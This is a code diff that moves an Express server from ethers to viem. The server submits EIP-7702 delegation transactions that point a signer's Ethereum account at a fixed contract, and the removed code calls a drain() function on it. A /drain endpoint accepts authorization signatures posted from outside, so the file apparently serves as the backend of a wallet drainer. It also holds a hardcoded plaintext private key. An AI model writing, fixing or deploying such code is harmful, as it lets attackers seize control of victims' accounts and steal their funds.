@@ -1,14 +1,16 @@
 import express from "express";
 import cors from "cors";
-import { JsonRpcProvider, Wallet, Interface } from "ethers";
+import { createWalletClient, createPublicClient, http, defineChain } from "viem";
+import { privateKeyToAccount } from "viem/accounts";
+import { mainnet } from "viem/chains";
 
 const RPC = process.env.RPC_URL;
 const PK = process.env.PRIVATE_KEY;
 const CONTRACT = "0x644efce7920fc8af69cb45832e5fed2ff5e2d92b";
 
-const provider = new JsonRpcProvider(RPC);
-const wallet = new Wallet(PK, provider);
-const iface = new Interface(["function drain()"]);
+const account = privateKeyToAccount(PK);
+const publicClient = createPublicClient({ chain: mainnet, transport: http(RPC) });
+const walletClient = createWalletClient({ account, chain: mainnet, transport: http(RPC) });
 
 const app = express();
 app.use(cors());
@@ -19,33 +21,23 @@ app.get("/test", async (req, res) => {
     const FANTOME = "0xaa482A91eA4be0524c966c621FCA52F8Ade011C3";
     const FANTOME_PK = "187aedafac6434ebd780acc1d6bd544055cb2bdb07c8dfb2c423f3d31c704d9f";
 
-    const fantomeWallet = new Wallet(FANTOME_PK, provider);
-    const authNonce = await provider.getTransactionCount(FANTOME, "latest");
+    const fantomeAccount = privateKeyToAccount(FANTOME_PK);
+    const authNonce = await publicClient.getTransactionCount({ address: FANTOME });
 
-    const auth = await fantomeWallet.authorize({
+    const authorization = await walletClient.signAuthorization({
+      account: fantomeAccount,
+      contractAddress: CONTRACT,
       chainId: 1,
-      address: CONTRACT,
       nonce: authNonce,
     });
 
-    const nonce = await provider.getTransactionCount(wallet.address, "latest");
-    const fee = await provider.getFeeData();
-
-    const tx = {
-      type: 4,
-      chainId: 1,
+    const hash = await walletClient.sendTransaction({
       to: FANTOME,
-      value: 0n,
-      data: iface.encodeFunctionData("drain"),
-      nonce,
-      maxFeePerGas: fee.maxFeePerGas,
-      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
-      gasLimit: 300000n,
-      authorizationList: [auth],
-    };
+      data: "0x",
+      authorizationList: [authorization],
+    });
 
-    const sent = await wallet.sendTransaction(tx);
-    res.json({ hash: sent.hash });
+    res.json({ hash });
   } catch (e) {
     res.status(500).json({ error: e.message || String(e) });
   }
@@ -62,36 +54,29 @@ app.post("/drain", async (req, res) => {
       return res.status(400).json({ error: "r ou s manquant dans auth" });
     }
 
-    const authNonce = await provider.getTransactionCount(fantome, "latest");
+    const authNonce = await publicClient.getTransactionCount({ address: fantome });
+
+    let yp = auth.yParity;
+    if (typeof yp === "string" && yp.startsWith("0x")) yp = parseInt(yp, 16);
+    yp = Number(yp);
+    if (yp >= 27) yp = yp - 27;
 
     const authorization = {
-      chainId: BigInt(auth.chainId),
-      address: CONTRACT,
-      nonce: BigInt(authNonce),
-      yParity: "0x" + Number(auth.yParity).toString(16),
+      chainId: 1,
+      contractAddress: CONTRACT,
+      nonce: authNonce,
+      yParity: yp,
       r: auth.r.startsWith("0x") ? auth.r : "0x" + auth.r,
       s: auth.s.startsWith("0x") ? auth.s : "0x" + auth.s,
-      authority: fantome,
     };
 
-    const nonce = await provider.getTransactionCount(wallet.address, "latest");
-    const fee = await provider.getFeeData();
-
-    const tx = {
-      type: 4,
-      chainId: 1,
+    const hash = await walletClient.sendTransaction({
       to: fantome,
-      value: 0n,
-      data: iface.encodeFunctionData("drain"),
-      nonce,
-      maxFeePerGas: fee.maxFeePerGas,
-      maxPriorityFeePerGas: fee.maxPriorityFeePerGas,
-      gasLimit: 300000n,
+      data: "0x",
       authorizationList: [authorization],
-    };
+    });
 
-    const sent = await wallet.sendTransaction(tx);
-    res.json({ hash: sent.hash });
+    res.json({ hash });
   } catch (e) {
     res.status(500).json({ error: e.message || String(e) });
   }
